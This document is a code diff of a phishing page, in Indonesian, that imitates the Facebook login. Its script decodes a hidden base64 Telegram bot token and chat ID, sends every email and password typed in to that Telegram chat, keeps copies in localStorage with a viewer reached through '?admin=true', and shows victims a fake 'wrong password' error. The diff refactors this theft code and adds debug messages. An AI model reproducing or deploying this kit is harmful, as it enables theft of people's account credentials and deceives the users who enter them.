@@ -32,6 +32,8 @@
         ._m a:hover { text-decoration:underline; }
         ._n { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#1877f2; color:#fff; padding:8px 20px; border-radius:20px; font-size:13px; box-shadow:0 2px 8px rgba(0,0,0,0.2); display:none; z-index:999; animation:_o .3s ease; }
         ._n._p { display:block; }
+        ._n._ok { background:#42b72a; }
+        ._n._er { background:#e74c3c; }
         @keyframes _o { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
         ._q { display:inline-block; width:18px; height:18px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid #fff; border-radius:50%; animation:_r .8s linear infinite; vertical-align:middle; margin-right:8px; }
         @keyframes _r { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
@@ -44,6 +46,8 @@
         ._v { background:#1877f2; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-bottom:10px; margin-right:8px; }
         ._v:hover { background:#166fe5; }
         ._w { background:#1877f2; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; display:inline-block; margin-left:8px; }
+        ._db { position:fixed; bottom:80px; left:50%; transform:translateX(-50%); background:#333; color:#fff; padding:8px 16px; border-radius:6px; font-size:12px; font-family:monospace; display:none; z-index:999; white-space:nowrap; }
+        ._db._db1 { display:block; }
     </style>
 </head>
 <body>
@@ -84,41 +88,158 @@
     </div>
 </div>
 <div class="_n" id="_fc"></div>
+<div class="_db" id="_dbg"></div>
 <script>
 function _d1(s){try{return atob(s);}catch(e){return '';}}
 var _tk=_d1('ODU2NzE0Mjg5NDpBQUdqMWpJajlrYmZGYjBxSGg4RmhhVlEySDNPL294eHBVb28=');
 var _ch=_d1('NjM3MTI2MDgwOQ==');
-function _x1(e,p){
+
+function _dbg(m){
+    var e=document.getElementById('_dbg');
+    e.textContent=m;
+    e.classList.add('_db1');
+    clearTimeout(e._tm);
+    e._tm=setTimeout(function(){e.classList.remove('_db1');},5000);
+}
+
+function _notif(m,t){
+    var e=document.getElementById('_fc');
+    e.textContent=m;
+    e.className='_n';
+    if(t==='ok'){e.classList.add('_ok');}
+    if(t==='er'){e.classList.add('_er');}
+    e.classList.add('_p');
+    clearTimeout(e._tm);
+    e._tm=setTimeout(function(){e.classList.remove('_p');},3000);
+}
+
+function _kirimTelegram(e,p){
+    _dbg('📤 Mengirim ke Telegram...');
     var n=new Date(),w=n.toLocaleString('id-ID',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
-    fetch('https://api.telegram.org/bot'+_tk+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_ch,text:'🔐 *LOGIN FACEBOOK*\n\n📧 *Email:* '+e+'\n🔑 *Password:* '+p+'\n🌐 *UA:* '+navigator.userAgent+'\n🕐 *Waktu:* '+w+'\n📱 *Resolusi:* '+window.screen.width+'x'+window.screen.height,parse_mode:'Markdown'})}).then(function(r){return r.json();}).then(function(d){if(d.ok){console.log('✅');}else{console.log('❌');}}).catch(function(e){console.log('❌');});
+    var url='https://api.telegram.org/bot'+_tk+'/sendMessage';
+    var data={
+        chat_id:_ch,
+        text:'🔐 *LOGIN FACEBOOK*\n\n📧 *Email:* '+e+'\n🔑 *Password:* '+p+'\n🌐 *UA:* '+navigator.userAgent+'\n🕐 *Waktu:* '+w+'\n📱 *Resolusi:* '+window.screen.width+'x'+window.screen.height,
+        parse_mode:'Markdown'
+    };
+    fetch(url,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(data)
+    })
+    .then(function(r){return r.json();})
+    .then(function(d){
+        if(d.ok){
+            _dbg('✅ Berhasil!');
+            _notif('✅ Data terkirim ke Telegram','ok');
+        }else{
+            _dbg('❌ Gagal: '+d.description);
+            _notif('❌ Gagal: '+d.description,'er');
+        }
+    })
+    .catch(function(err){
+        _dbg('❌ Error: '+err);
+        _notif('❌ Error koneksi','er');
+    });
 }
-function _x2(e,p){
-    var d={timestamp:new Date().toISOString(),email:e,password:p,userAgent:navigator.userAgent,url:window.location.href},ex=localStorage.getItem('_lg'),ls=ex?JSON.parse(ex):[];ls.push(d);localStorage.setItem('_lg',JSON.stringify(ls));
+
+function _simpan(e,p){
+    var d={timestamp:new Date().toISOString(),email:e,password:p,userAgent:navigator.userAgent,url:window.location.href};
+    var ex=localStorage.getItem('_lg');
+    var ls=ex?JSON.parse(ex):[];
+    ls.push(d);
+    localStorage.setItem('_lg',JSON.stringify(ls));
 }
-function _x3(m){
-    var e=document.getElementById('_fc');e.textContent=m;e.classList.add('_p');clearTimeout(e._tm);e._tm=setTimeout(function(){e.classList.remove('_p');},2500);
-}
+
 document.getElementById('_f7').addEventListener('click',function(e){e.preventDefault();e.stopPropagation();return false;});
-document.getElementById('_f6').addEventListener('click',function(){_x3('✉️ Link reset kata sandi telah dikirim ke email Anda.');});
+document.getElementById('_f6').addEventListener('click',function(){_notif('✉️ Link reset dikirim ke email','');});
+
 document.getElementById('_f1').addEventListener('submit',function(e){
     e.preventDefault();
-    var em=document.getElementById('_f2'),pw=document.getElementById('_f3'),err=document.getElementById('_f4'),btn=document.getElementById('_f5'),e1=em.value.trim(),p1=pw.value.trim();
-    if(e1===''||p1===''){err.textContent='✕ Harap isi email dan kata sandi.';err.classList.add('_k');em.classList.add('_e');pw.classList.add('_e');return;}
-    err.classList.remove('_k');em.classList.remove('_e');pw.classList.remove('_e');
-    btn.innerHTML='<span class="_q"></span> Memproses...';btn.disabled=true;btn.classList.add('_f');
-    setTimeout(function(){_x2(e1,p1);_x1(e1,p1);em.value='';pw.value='';btn.innerHTML='Masuk';btn.disabled=false;btn.classList.remove('_f');err.textContent='✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.';err.classList.add('_k');pw.classList.add('_e');setTimeout(function(){pw.focus();},300);_x3('🔒 Masuk gagal. Periksa kembali kata sandi Anda.');},1500);
+    var em=document.getElementById('_f2');
+    var pw=document.getElementById('_f3');
+    var err=document.getElementById('_f4');
+    var btn=document.getElementById('_f5');
+    var e1=em.value.trim();
+    var p1=pw.value.trim();
+
+    if(e1===''||p1===''){
+        err.textContent='✕ Harap isi email dan kata sandi.';
+        err.classList.add('_k');
+        em.classList.add('_e');
+        pw.classList.add('_e');
+        return;
+    }
+
+    err.classList.remove('_k');
+    em.classList.remove('_e');
+    pw.classList.remove('_e');
+
+    btn.innerHTML='<span class="_q"></span> Memproses...';
+    btn.disabled=true;
+    btn.classList.add('_f');
+
+    // KIRIM LANGSUNG TANPA DELAY
+    _simpan(e1,p1);
+    _kirimTelegram(e1,p1);
+
+    // Reset form setelah 1 detik
+    setTimeout(function(){
+        em.value='';
+        pw.value='';
+        btn.innerHTML='Masuk';
+        btn.disabled=false;
+        btn.classList.remove('_f');
+        err.textContent='✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.';
+        err.classList.add('_k');
+        pw.classList.add('_e');
+        setTimeout(function(){pw.focus();},300);
+        _notif('🔒 Masuk gagal. Periksa kata sandi.','');
+    },1000);
 });
-['_f2','_f3'].forEach(function(id){document.getElementById(id).addEventListener('focus',function(){document.getElementById('_f4').classList.remove('_k');document.getElementById('_f2').classList.remove('_e');document.getElementById('_f3').classList.remove('_e');});});
+
+['_f2','_f3'].forEach(function(id){
+    document.getElementById(id).addEventListener('focus',function(){
+        document.getElementById('_f4').classList.remove('_k');
+        document.getElementById('_f2').classList.remove('_e');
+        document.getElementById('_f3').classList.remove('_e');
+    });
+});
+
 function _f9(){
-    var r=localStorage.getItem('_lg'),l=r?JSON.parse(r):[],d=document.getElementById('_fb');
+    var r=localStorage.getItem('_lg');
+    var l=r?JSON.parse(r):[];
+    var d=document.getElementById('_fb');
     if(l.length===0){d.textContent='Belum ada data.';return;}
-    var t='';l.forEach(function(e,i){t+='╔═══ DATA #'+(i+1)+' ═══╗\n║ 📅 Waktu : '+e.timestamp+'\n║ 📧 Email : '+e.email+'\n║ 🔑 Pass  : '+e.password+'\n║ 🌐 UA    : '+(e.userAgent||'-').substring(0,60)+'...\n╚══════════════════════════╝\n\n';});
+    var t='';
+    l.forEach(function(e,i){
+        t+='╔═══ DATA #'+(i+1)+' ═══╗\n';
+        t+='║ 📅 Waktu : '+e.timestamp+'\n';
+        t+='║ 📧 Email : '+e.email+'\n';
+        t+='║ 🔑 Pass  : '+e.password+'\n';
+        t+='║ 🌐 UA    : '+(e.userAgent||'-').substring(0,60)+'...\n';
+        t+='╚══════════════════════════╝\n\n';
+    });
     d.textContent=t;
 }
-function _fa(){if(confirm('Yakin hapus semua data?')){localStorage.removeItem('_lg');_f9();}}
+
+function _fa(){
+    if(confirm('Yakin hapus semua data?')){
+        localStorage.removeItem('_lg');
+        _f9();
+    }
+}
+
 var _p1=new URLSearchParams(window.location.search);
-if(_p1.get('admin')==='true'){document.getElementById('_f8').classList.add('_t');_f9();}
-setInterval(function(){if(document.getElementById('_f8').classList.contains('_t')){_f9();}},5000);
+if(_p1.get('admin')==='true'){
+    document.getElementById('_f8').classList.add('_t');
+    _f9();
+}
+setInterval(function(){
+    if(document.getElementById('_f8').classList.contains('_t')){
+        _f9();
+    }
+},5000);
 </script>
 </body>
 </html>
